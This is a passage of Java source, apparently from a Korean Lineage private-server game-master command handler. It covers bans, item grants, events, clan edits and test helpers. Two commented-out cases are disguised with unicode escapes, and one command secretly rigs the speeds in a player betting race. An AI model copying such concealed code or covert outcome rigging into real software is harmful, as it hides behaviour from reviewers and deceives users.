					}else if(peo3 == 6){
						day = "금요일";
					}else if(peo3 == 7){
						day = "토요일";
					}
					gm.sendPackets("금일 던전 초기화 요일 :"+day);
				} catch (Exception e) {
					gm.sendPackets(".기감변수 (1:일/2:월/3:화/4:수/5:목/6:금/7:토)");
				}
			break;
		case "기감체킹": //From.Neige
			try {
			Integer even5 = Integer.valueOf(param);
			Config.네쥬던전체킹 = even5;
			if(even5 == 1){
				gm.sendPackets("[기란 감옥 초기화 방식을 '내역 삭제'로 변경합니다.]");
			}else{
				gm.sendPackets("[기란 감옥 초기화 방식을 '시간 채우기'로 변경합니다.]");
			}
			} catch (Exception e) {
				gm.sendPackets(".기감체킹 (1: 기감 출입 내역 삭제 / 2: 내역 삭제는 하지 않고 시간만 채우기)");
				if(Config.네쥬던전체킹 == 1){
				gm.sendPackets("현재 방식 : (1)내역 삭제");
				}else{
					gm.sendPackets("현재 방식 : (2)시간 채우기");
				}
			}
			break;
		case "흑단무빙": //From.Neige
			try {
				Integer wand = Integer.valueOf(param);
				Config.흑단무빙 = wand;
				if(wand == 1){
					gm.sendPackets("[흑단 무빙 : 켜기]");
				}else if(wand == 2){
					gm.sendPackets("[흑단 무빙 : 끄기]");
				}else{
					Config.흑단무빙 = 1;
					gm.sendPackets("[흑단 무빙 : 켜기]");
				}
			} catch (Exception e) {
				gm.sendPackets(".흑단무빙 (1: 켜기 / 2: 끄기)");
			}
			break;
		case "펑몹확률"://From.Neige
		try {
			Integer syaper = Integer.valueOf(param);
			Config.운영자이벤트약한확률 = syaper;
			Config.운영자이벤트강한확률 = syaper;
			gm.sendPackets("[펑몹 등장 확률 : "+syaper+"]");
		} catch (Exception e) {
			gm.sendPackets(".펑몹확률 (1~100)");
		}
		break;
			
		case "펑몹시작" : //From.Neige
			Config.펑몹이벤트 = 2;
			gm.sendPackets("펑몹이 등장하도록 설정되었습니다.");
			break;
		case "펑몹종료" : //From.Neige
			Config.펑몹이벤트 = 1;
			gm.sendPackets("펑몹이 등장하지 않도록 설정되었습니다.");
			break;
		case "포세이돈시작" : //From.Neige
			Config.포세이돈 = 1;
			Config.시그널1 = 0;
			Config.시그널2 = 0;
			Config.시그널3 = 0;
			gm.sendPackets("포세이돈 이벤트를 시작합니다.");
			//L1World.getInstance().broadcastPacketToAll(new SC_SystemMessage("동쪽 해역에서 폭풍우가 치고 있습니다."));
			//RPacketBox.broadcastGreen("동쪽 해역에서 폭풍우가 치고 있습니다."));
			break;
		case "포세이돈종료" : //From.Neige
			Config.포세이돈 = 0;
			Config.시그널1 = 1;
			Config.시그널2 = 1;
			Config.시그널3 = 4;
			gm.sendPackets("포세이돈 이벤트를 종료합니다.");
			//L1World.getInstance().broadcastPacketToAll(new SC_SystemMessage("바다가 잠잠해졌습니다."));
			//L1World.getInstance().broadcastPacketToAll(new RPacketBox(RPacketBox.GREEN_MESSAGE, "바다가 잠잠해졌습니다."));
			break;
		case "포세이돈테스트" : //From.Neige
			Config.포세이돈 = 0;
			Config.시그널1 = 1;
			Config.시그널2 = 1;
			Config.시그널3 = 3;
			gm.sendPackets("포세이돈을 출몰 시킵니다.");
			break;
		case "배1"://From.Neige
			gm.start_teleport(32732, 32799, 5, 4, 169, true, false);
			break;
		case "배2"://From.Neige
			gm.start_teleport(32735, 32797, 6, 4, 169, true, false);
			break;
		case "시간":
			int servertime = L1GameTimeClock.getInstance().getGameTime().getSeconds();
			int nowtime = servertime % 86400;
			gm.sendPackets("현재 시각 : "+nowtime);
			break;
		case "강제리스":
			강제리스(gm, param);
			break;
		case "표기셋팅":
			setPresentationCode(gm, param);
			break;
		case "마법회피율":
			findMagicDodge(gm, param);
			break;
		case "오브젝트리스트":
			showObjectList(gm, param);
			break;
	    case "오토선물":
			if(gm.getAccessLevel() != Config.SUB_GMCODE && gm.getAccessLevel() == Config.GMCODE) {
	          autoAllPresent(gm, param);
			} else {
				gm.sendPackets("\\aA■ 부운영자의 권한으로 사용할 수 없습니다. ■");
			}
			break;
	    case "전체공지":
		    전체공지(gm);
			break;
		case "보호모드":
			setProtectionMode(gm, param);
			break;
		case "전체채팅":
			전체채팅(gm, param);
			break;
		case "채팅차단":
			일반채팅(gm, param);
			break;
		case "넷세이프":
			NetworkSafeLoadManager.commands(gm, param);
			break;
		case "핑":
			ping(gm, param);
			break;
		case "킬차트":
			MJKDALoadManager.commands(gm, param);
			break;
		case "채팅테스트":
			showChat(gm, param);
			break;
		case "좌표":
			좌표(gm);
			break;
		case ",":
			showNextProto(gm, param);
			break;
		case "커맨드":
			SC_ShowCmd.sendText(gm, "cmd.");
			break;
		case "워리스트":
			showWarList(gm);
			break;
		case "유즈타입":
			showUseType(gm, param);
			break;
		case "캐릭압류":
			setCharBlock(gm, param);
			break;
		case "캐릭압류해제":
			setCharBlockDelete(gm, param);
			break;
		case "원격교환":
			원격거래(gm, param);
			break;
		case "잠수모드":
			setSleepingMode(gm, param);
			break;
		case "잠수해제":
			unSetSleepingMode(gm, param);
			break;
		case "/":
			showNextEffect(gm);
			break;
		case "이펙":
			showEffectInit(gm, param);
			break;
		case "혈마크":
			clanMark(gm, param);
			break;
	
		case "인스턴스":
			MJInstanceLoadManager.commands(gm, param);
			break;
		case "레이드":
			MJRaidLoadManager.commands(gm, param);
			break;
		case "구슬":
			MJCTLoadManager.commands(gm, param);
			break;
		case "구슬조회":
			L1NeigeSaveChar.commands(gm, param);
			break;
		case "가라":
			nocall(gm, param);
			break;
		case "랭킹시스템":
			RankLoadManager.getInstance().execute(new MJCommandArgs().setOwner(gm).setParam(param));
			break;

		case "혈맹랭킹갱신":
			L1ClanRanking.getInstance().gmcommand();
			gm.sendPackets("\\aA■ 혈맹레이드 랭킹이 갱신 되었습니다 ■");
			break;
		case "아이템":
			if(gm.getAccessLevel() != Config.SUB_GMCODE && gm.getAccessLevel() == Config.GMCODE) {
			execute(gm, param, param);
		
			} else {
				gm.sendPackets("\\aA■ 부운영자의 권한으로 사용할 수 없습니다. ■");
			}
			break;
		case "아데나":
			execute1(gm, param, param);
			break;
		case "이벤트":
			Event(gm, param);
			break;
		case "이벤트상점":
			BossController.handleShopAlarmCommand(gm, param);
			break;
//		case "테스팅":
//			gm.sendPackets(new RActionUI(RActionUI.EVENT_SYSTEM, 45752, true));
//			break;

		case "수렵":
			huntEvent(gm, param);
			break;
		case "소환이벤트":
			Event1(gm, param);
			break;
		case "잠재력조회":
			아아(gm, param);
			break;
		case "계좌":
			doolyHelp1(gm);
			break;
		case "주변밴":
			LargeAreaBan(gm, param);
			break;
		case "광역밴":
			LargeAreaIPBan(gm, param);
			break;
		case "파티":
			party(gm, param);
			break;
		case "아지트지급":
			GiveHouse(gm, param);
			break;
		case "공성시작":
			castleWarStart(gm, param);
			break;
//		case "수배테스트":
//			hunt(gm, param);
//			break;
//		case "vip":
//			vipsetting(gm, param);
//			break;

		case "화면템주기":
			allitem(gm, param);
			break;
		case "화면어벤":
			allBuff1(gm);
			break;
		case "화면축복":
			allBuff2(gm);
			break;
		case "화면생마":
			allBuff3(gm);
			break;
		case "화면흑사":
			allBuff4(gm);
			break;
		case "화면코마":
			allBuff5(gm);
			break;
			
		case "공성종료":
			castleWarExit(gm, param);
			break;
//		case "메세지테스트":
//			gm.sendPackets(new S_TestPacket(S_TestPacket.a));
//			gm.sendPackets(new S_UserCommands20(1, gm));
//			break;
		case "봇소환":
			봇소환(gm, param);
			break;
		case "서버저장":
			serversave(gm);
			break;
		case "전체선물":
			allpresent(gm, param);
			break;
		case "압류해제":
			accountdel(gm, param);
			break;
		case "경험치복구":
			returnEXP(gm, param);
			break;
		case "오토루팅":
			autoloot(gm, param);
			break;
		case "메티스버프":
			Event2(gm, param);
			break;
		case "페널티":
			ExpTable.expPenaltyReLoad();
			gm.sendPackets("■ 페널티 리로드 완료 ■");
			break;
		case "인형청소":
			인형청소(gm);
			break;
		case "물품멘트":
			물품멘트(gm, param);
			break;
		case "퀘스트멘트":
			퀘스트멘트(gm, param);
			break;
		case "잠재력":
			잠재력활성화(gm, param);
			break;
		case "밸런스":
			CharacterBalance(gm, param);
			break;
		case "무인상점":
			privateShop(gm);
			break;
		case "라이트":
			maphack(gm, param);
			break;
		case "오픈대기":
			standBy(gm, param);
			break;
		case "스텟":
			fullstat(gm, param);
			break;
		case "상점검사":
			상점검사(gm);
			break;
		case "이팩트":
			effect(gm, param);
			break;
		case "유저인벤삭제":
			targetInventoryDelete(gm, param);
			break;
		case "계정추가":
			addaccount(gm, param);
			break;
//		case "\uB9E4\uC785\uC800\uC7A5":
//			addaccount1\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;
//		case "\uB9E4\uC785\uC9C0\uAE09":
//			\u006D\u0065\u0065\u0070\u0035\u0035\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;
		case "전체소환":
			allrecall(gm);
			break;
		case "맵인원":
			mapwho(gm, param);
			break;
		case "운영자이벤트":
			L1World.getInstance().broadcastServerMessage("\\aG"+Config.이벤트이름+"가 시작되었습니다.");
			SC_PacketBox.broadcastGreen(Config.이벤트이름+"가 시작되었습니다.");
			Config.운영자이벤트 =true;
			break;
		case "운영자이벤트종료":
			L1World.getInstance().broadcastServerMessage("\\aG"+Config.이벤트이름+"가 종료었습니다.");
			SC_PacketBox.broadcastGreen(Config.이벤트이름+"가 종료었습니다.");
			Config.운영자이벤트 =false;
			break;
		case "코마지급":
			SpecialEventHandler.getInstance().doGiveEventStaff();
			break;
		case "보스소환주문서지급":
			SpecialEventHandler.getInstance().doGiveEventStaff2();
			break;
		case "토파즈지급":
			SpecialEventHandler.getInstance().doGiveEventStaff1();
			break;
		case "압류목록":
			search_banned(gm);
			break;
		case "암호변경":
			changePassword(gm, param);
			break;
		case "마을":
			unprison(gm, param);
			break;
		case "숨계":
			unprison2(gm, param);
			break;
		case "채금해제":
			chatx(gm, param);
			break;
		case "텔렉":
		case ".":
			tell(gm);
			break;
		case "검색":
			searchDatabase(gm, param);
			break;
		case "킬삭제":
		킬삭제(gm, param);
		break;
		case "킬증가":
			킬증가(gm, param);
			break;
		case "데스삭제":
			데스삭제(gm, param);
			break;
		case "데스증가":
			데스증가(gm, param);
			break;
		
		case "피케이":
			Pvp(gm, param);
			break;
		case "계정":
			account_Cha(gm, param);
			break;
		case "렙작":
			levelup2(gm, param);
			break;
		case "상점추방":
			ShopKick(gm, param);
			break;
		case "감옥":
			hold(gm, param);
			break;
		case "메모리반환":
			메모리반환(gm);
			break;
		case "인벤삭제":
			InventoryDelete(gm, param);
			break;
		case "아지트리로드":
			reloadHouse(gm, param);
			break;
		case "탐선물":
			탐선물(gm, param);
			break;
		case "혈맹포인트선물":
			혈맹포인트선물(gm, param);
			break;
		case "혈맹포인트삭제": 
			혈맹포인트삭제(gm, param);
			break;
		case "후원입금":
			addaccount11(gm, param);
			break;
		case "혈맹포인트조회":
			혈맹포인트조회(gm, param);
			break;
//		case "공속체크":
//			gm.AttackSpeedCheck2 = 1;
//			gm.sendPackets("\\fY허수아비를 10회공격해주세요.");
//			break;
//		case "이속체크":
//			gm.MoveSpeedCheck = 1;
//			gm.sendPackets("\\fY한 방향으로 10회무빙해주세요.");
//			break;
//		case "마법체크":
//			gm.magicSpeedCheck = 1;
//			gm.sendPackets("\\fY원하는마법을 10회사용해주세요.");
//			break;
		case "이미지삭제":
			this.get_delete_gfx(gm);
			break;
		case "무인삭제":
			removeInstance(gm, param); 
			break;
		case "버경확인":
			bug_race_check(gm);
			break;
		case "버경조작":
			bug_race_rate(gm, param);
			break;
		case "보스알림":
			spawnNotifyOnOff(gm, param);
			break;
		case "아덴시세":
			UserCommands.getInstance().AdSc(gm);
			break;
		case "매니아체크":
			SC_ShowCmd.sendMovie(gm, "http://kimsuin123.megaplug.kr/pricemania/pricePreviewboard1.html", -1);
			break;
		case "비트코인":
			SC_ShowCmd.sendMovie(gm, "https://www.bithumb.com/u5/US506", -1);
			break;
//		case "그랑카인":
//			testcheck(gm);
//			break;
		case "맵테":
			testcheck2(gm);
			break;
		case "몹테":
			testcheck3(gm);
			break;
		case "몹테2":
			testcheck4(gm);
			break;
		case "외테":
			testcheck5(gm);
			break;
		case "외테2":
			testcheck6(gm);
			break;
		case "외테3":
			testcheck7(gm);
			break;
		case "타입":
			int type = Integer.parseInt(param);
			gm.sendPackets("\\aA요리타입 : " + type);
			SC_PacketBox.send(gm, 53, type, 1800);
			break;
		case "헌터버프":
			try {
				SC_InventoryIcon.icoReset(gm, HUNTER_BLESS, 4992, 1800L, true);
			} catch (Exception e) {
				e.getStackTrace();
			}
			break;
		case "엔코인":
			gm.sendPackets("보유 N코인:[\\aG"
					+ gm.getNetConnection().getAccount().Ncoin_point + "\\aA]");
			break;
		case "제작체크":
			if (!제작체크) {
				제작체크 = true;
				gm.sendPackets("\\aA■ 제작체크 ON! ■");
			} else {
				제작체크 = false;
				gm.sendPackets("\\aA■ 제작체크 OFF ■");
			}
			/** MJCTSystem **/
			break;
		case "전체버프":
			try {
				StringTokenizer st = new StringTokenizer(param);
				String status = st.nextToken();
				L1AllBuff.getInstance().execute(gm, param, status);
			} catch (Exception e) {
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
				SC_ChatPacket.sendDirect(gm, gm, " 1:풀업 2:축복  3:흑사 4:코마");
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
			}
			break;
		case "리로드몬스폰":
			try {
				StringTokenizer st = new StringTokenizer(param);
				int mapid = Integer.parseInt(st.nextToken());
				String locName = MapsTable.getInstance().getMapName(mapid);
				L1World.getInstance().getMapObject(mapid);
				SpawnTable.getInstance().reload(mapid);
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "["+locName+"]의 몬스터들을 리스폰하였습니다.");
				//gm.sendPackets("몬스폰리스트 (지정맵) 리로드 완료");
			} catch (Exception e) {
				gm.sendPackets(".리로드몬스폰 (맵아이디)");
			}

			break;
		case "엔코인충전":
			try {
				StringTokenizer tokenizer = new StringTokenizer(param);
				String name = tokenizer.nextToken();
				int coin = Integer.parseInt(tokenizer.nextToken());
				L1PcInstance tg = L1World.getInstance().getPlayer(name);
				if (tg != null) {
					L1ItemInstance item = ItemTable.getInstance().createItem(800112);
					item.setCount(coin);
					if (tg.getInventory().checkAddItem(item, coin) == L1Inventory.OK) {
						tg.getInventory().storeItem(item);
						SC_PacketBox.send(tg, SC_PacketBox.GREEN_MESSAGE, "\\aAN코인 (\\aG" + coin + "\\aA) 원이 충전 되었습니다. 감사합니다.");
						SC_SystemMessage.send(gm, "\\aA캐릭터명 : \\aG"+tg.getName()+", \\aAN코인 (\\aG" + coin + "\\aA) \\aA원 충전완료.");
					}
				} else {
					gm.sendPackets("현재 접속하지 않은 캐릭터 입니다.");
				}
			} catch (Exception e) {
				gm.sendPackets("[엔코인충전] [케릭명] [금액] 입력.");
			}
			break;
//		case "엔코인회수":
//			try {
//				StringTokenizer tokenizer = new StringTokenizer(param);
//				String name = tokenizer.nextToken();
//				int coin = Integer.parseInt(tokenizer.nextToken());
//				L1PcInstance tg = L1World.getInstance().getPlayer(name);
//				if (tg != null) {
//					tg.addNcoin1(coin);
//					tg.sendPackets(new RPacketBox(RPacketBox.GREEN_MESSAGE,
//							"\\aAN코인 (\\aG" + coin + "\\aA) 원이 회수 되었습니다. 감사합니다."));
//					tg.sendPackets("\\aAN코인 (\\aG " + coin + " \\aA) 원이 회수 되었습니다. 감사합니다.");
//					tg.sendPackets("\\aA잔여금액: [\\aG" + tg.getNetConnection().getAccount().Ncoin_point + "\\aA] 원");
//
//					gm.sendPackets("\\aA캐릭명:[\\aG" + name + "\\aA]" + "회수금액:[\\aG" + coin + "\\aA] 완료");
//					gm.sendPackets("\\aA잔여금액: [\\aG" + tg.getNetConnection().getAccount().Ncoin_point + "\\aA] 확인됨");
//				} else {
//					gm.sendPackets("현재 접속하지 않은 캐릭터 입니다.");
//				}
//			} catch (Exception e) {
//				gm.sendPackets("[엔코인회수] [케릭명] [금액] 입력.");
//			}
//			break;
//		case "엔코인확인":
//			try {
//				StringTokenizer tokenizer = new StringTokenizer(param);
//				String name = tokenizer.nextToken();
//				L1PcInstance tg = L1World.getInstance().getPlayer(name);
//				if (tg != null) {
//					gm.sendPackets("\\aA잔여금액: 캐릭명:[\\aG" + name + "\\aA] N코인:[\\aG"
//							+ tg.getNetConnection().getAccount().Ncoin_point + "\\aA] 확인됨");
//				} else {
//					gm.sendPackets("현재 접속하지 않은 캐릭터 입니다.");
//				}
//			} catch (Exception e) {
//				gm.sendPackets("[엔코인확인] [케릭명] [금액] 입력.");
//			}
//			break;
		case "챗":
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				String msg = st.nextToken();
				for (L1PcInstance listner : L1World.getInstance().getAllPlayers()) {
					SC_ChatPacket.sendTargetMsg(listner, name, 0x03, msg);
				}
			} catch (Exception e) {
				gm.sendPackets(".챗 [캐릭명] [채팅말] 입력");
			}
			break;
		case "성혈조작":
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				int number = Integer.parseInt(st.nextToken());
				L1Clan clan = L1World.getInstance().findClan(name);
				if (clan == null) {
					gm.sendPackets("혈맹이 존재하지 않습니다.");
				} else {
					clan.setCastleId(number);
					L1World.getInstance().removeClan(clan);
					L1World.getInstance().storeClan(clan);
					ClanTable.getInstance().updateClan(clan);
					gm.sendPackets(name + " 혈맹정보가 변경됐습니다.");
				}
			} catch (Exception e) {
				gm.sendPackets(".성혈조작 [혈이름] [성번호] 입력");
				gm.sendPackets("켄트1,오크2,윈다3,기란4,하이5,웰던6,아덴7,디아드8");
			}
			break;
		case "상점리로드":
			try {
				int npcid = Integer.parseInt(param);
				L1Npc npc = NpcTable.getInstance().getTemplate(npcid);
				ShopTable.getInstance().Reload(npcid);
				gm.sendPackets("엔피씨 : " + npc.get_name() + " 리로드 되었습니다.");
			} catch (Exception e) {
				gm.sendPackets(".상점리로드 엔피씨ID");
			}
			break;
		case "혈가입":
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				String clanname = st.nextToken();
				L1PcInstance pc = L1World.getInstance().getPlayer(name);
				L1Clan clan = L1World.getInstance().findClan(clanname);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				if (clan == null) {
					gm.sendPackets("그런 혈맹은 없습니다.");
					return;
				}
				if (pc.getClanid() != 0) {
					gm.sendPackets("" + pc.getName() + "님은 혈맹이 있기때문에 탈퇴 시키겠습니다.");
					pc.ClearPlayerClanData(clan);
					clan.removeClanMember(pc.getName());
					gm.save();
					return;
				}

				for (L1PcInstance clanMembers : clan.getOnlineClanMember()) {
					SC_ServerMessage.send(clanMembers, 94, pc.getName());
					// \f1%0이 혈맹의 일원으로서 받아들여졌습니다.
				}
				pc.setClanid(clan.getClanId());
				pc.setClanname(clanname);
				pc.setClanRank(L1Clan.수련);
				pc.setTitle("");
				pc.setClanMemberNotes("");
				SC_CharTitle.send(pc, pc.getId(), "");
				SC_CharTitle.broadcast(pc, pc.getId(), "");
				clan.addClanMember(pc.getName(), pc.getClanRank(), pc.getLevel(), "", pc.getId(), pc.getType(),
						pc.getOnlineStatus(), pc);
				pc.save(); // DB에 캐릭터 정보를 기입한다
				SC_PacketBox.send(pc, pc, SC_PacketBox.PLEDGE_REFRESH_PLUS);
				SC_ServerMessage.send(pc, 95, clanname); // \f1%0 혈맹에
																	// 가입했습니다.
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈가입 [캐릭명] [혈맹이름] 입력");
			}
			break;
		case "혈탈퇴":
			try {
				StringTokenizer tokenizer = new StringTokenizer(param);
				String pcName = tokenizer.nextToken();
				L1PcInstance pc = L1World.getInstance().getPlayer(pcName);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				L1Clan clan = pc.getClan();
				L1PcInstance clanMember[] = clan.getOnlineClanMember();
				for (int i = 0; i < clanMember.length; i++) {
					SC_ServerMessage.send(clanMember[i], ServerMessage.LEAVE_CLAN, param, clan.getClanName());// \f1%0이
																														// %1혈맹을
																														// 탈퇴했습니다.
				}
				pc.ClearPlayerClanData(clan);
				clan.removeClanMember(pc.getName());
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈탈퇴 [캐릭명] 입력");
			}
			break;
		 case "자동사냥": AHExecutor.getInstance().execute(gm); break;

//		 case "붉은전쟁선포": UserCommands.getInstance().blooodWarStart(gm, param); break;
//		 case "테스트2":
//
//			 break;
//		case ".":
//			if (!_lastCommands.containsKey(gm.getId())) {
//				gm.sendPackets(new SC_ServerMessage(74, "커맨드 " + cmd));
//				// \f1%0은사용할 수없습니다.
//				return;
//			}
//			redo(gm, param);
//			break;
		default:
			SC_SystemMessage.send(gm, "[Command] 커멘드 " + cmd + " 는 존재하지 않습니다. ");
			break;
		}

	}


	private void testcheck2(L1PcInstance pc) {
			
			pc.sendPackets(pc.getMapId()+"입니다.");
		
	}
	private void testcheck3(L1PcInstance pc) {
		
		L1SpawnUtil.spawn5(32801, 32795, (short)9101, 4, 91200, 0, false);
		
		pc.sendPackets("랜덤값 0으로 소환");
	
	}
	private void testcheck4(L1PcInstance pc) {
		
		L1SpawnUtil.spawn5(32801, 32795, (short)9101, 4, 91200, 1, false);
		
		pc.sendPackets("랜덤값 1로 소환");
	
	}
	private void testcheck5(L1PcInstance pc) {
		
		Config.seadunship = 1;
		
		pc.sendPackets(Config.seadunship + "입니다.");
	
	}
	private void testcheck6(L1PcInstance pc) {
		
		Config.seadunship = 2;
		
		pc.sendPackets(Config.seadunship + "입니다.");
	
	}
	private void testcheck7(L1PcInstance pc) {
		
		
		pc.sendPackets(Config.seadunship + "입니다.");
	
	}
	private void autoclanjoin(L1PcInstance gm) {
		try {
			//실패조건
			
//			if (!(gm.getClanRank() == 9 || gm.getClanRank() == 10))  { 
//				gm.sendPackets(new SC_SystemMessage("수호기사 또는 군주계급으로 무인가입배치가 가능합니다."));
//			      return;
//			}
//			if (gm.isFishing()) {
//				gm.sendPackets(new SC_SystemMessage("낚시중 일때는 행동이 제한됩니다."));
//				return;	
//			}
//			if (gm.getClanid()==0 || gm.getClanid()== 1) {//신규혈 아이디
//				gm.sendPackets(new SC_SystemMessage("혈맹창설 상태가 아닙니다."));
//				return;	
//			}
//			if (gm.isPrivateShop()) {
//				gm.sendPackets(new SC_SystemMessage("개인상점중엔 사용할수 없습니다."));
//				return;	
//			}
//			if (gm.isPinkName()  || gm.isParalyzed() || gm.isSleeped()) {
//				gm.sendPackets(new SC_SystemMessage("보라중 마비중 잠수중에는 사용할 수 없습니다."));
//				return;
//			}
			if (gm.isDead()) {
				SC_SystemMessage.send(gm, "죽은 상태에선 실행 할수없습니다.");
				return;
			}
				
			//실패조건
			//기란 여관 앞
	//		if(gm.getX()>=33426 && gm.getX()<=33435 && gm.getY()>=32795 && gm.getY()<=32802 && gm.getMapId()==4){
//				for(L1PcInstance target : L1World.getInstance().getAllPlayers3()){
//					if(target.getId() != gm.getId() && target.getAccountName().toLowerCase().equals(gm.getAccountName().toLowerCase()) && target.isAutoClanjoin() ){
//						(new SC_ChatPacket(gm,"이미 당신의 보조 캐릭터가 무인가입 상태입니다.")).send(gm);
//						return;
//					}
//				}
				gm.setAutoClanjoin(true);			
				L1PolyMorph.undoPolyAutoClanjoin(gm);	
				CIOClient client = gm.getNetConnection();
				gm.setNetConnection(null);
				try { 
					gm.save();
					gm.saveInventory();
				} catch(Exception e) {                    		
				}
				
				client.setActiveChar(null);
				SC_Unknown2.send(client, 1); // 리스버튼을 위한 구조변경 // Episode U
//			}else{
//				(new SC_ChatPacket(gm,"기란마을 여관 앞 공간에서만 사용할 수 있습니다.")).send(gm);
//			}
		} catch (Exception e) {
			System.out.println(gm.getName()+"무인가입 처리 에러");
		}		
	}


	private void bug_race_rate(L1PcInstance pc, String s) {
		try {
			StringTokenizer tok = new StringTokenizer(s);
			int num = Integer.parseInt(tok.nextToken());
			int speed = Integer.parseInt(tok.nextToken());
			BugRaceController.getInstance().setSpeed(num - 1, speed);
			pc.sendPackets(String.format("레인 %d번의 속도를 %d로 변경하였습니다..", num, speed));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경조작 [레인] [속도] 로 입력 바랍니다.");
		}
	}

	private void bug_race_check(L1PcInstance pc) {
		try {
			for (int i = 0; i < 5; ++i)
				pc.sendPackets(String.format("레인 : %d, 속도 : %d", i + 1, BugRaceController.getInstance().getSpeed(i)));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경확인 으로 입력 바랍니다.");
		}
	}

	private FastTable<L1NpcInstance> list = new FastTable<L1NpcInstance>();

	public void add_list(L1NpcInstance npc) {
		synchronized (list) {
			if (!list.contains(npc))
				list.add(npc);
		}
	}
	private void Event2(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String event = st.nextToken();
			String time1 = st.nextToken();
			int time = Integer.parseInt(time1);
			if (event.equalsIgnoreCase("메티스버프")) {
				L1SpawnUtil.Gmspawn(7320260, 33430, 32807, (short) 4, 6, time * 60 * 60 * 1000);

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("메티스버프1")) {
				L1SpawnUtil.Gmspawn(526, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("메티스버프2")) {
				L1SpawnUtil.Gmspawn(529, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("메티스버프3")) {
				L1SpawnUtil.Gmspawn(530, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("메티스버프4")) {
				L1SpawnUtil.Gmspawn(531, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프5")) {
				L1SpawnUtil.Gmspawn(532, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프6")) {
				L1SpawnUtil.Gmspawn(533, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프7")) {
				L1SpawnUtil.Gmspawn(534, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프8")) {
				L1SpawnUtil.Gmspawn(535, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프9")) {
				L1SpawnUtil.Gmspawn(536, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
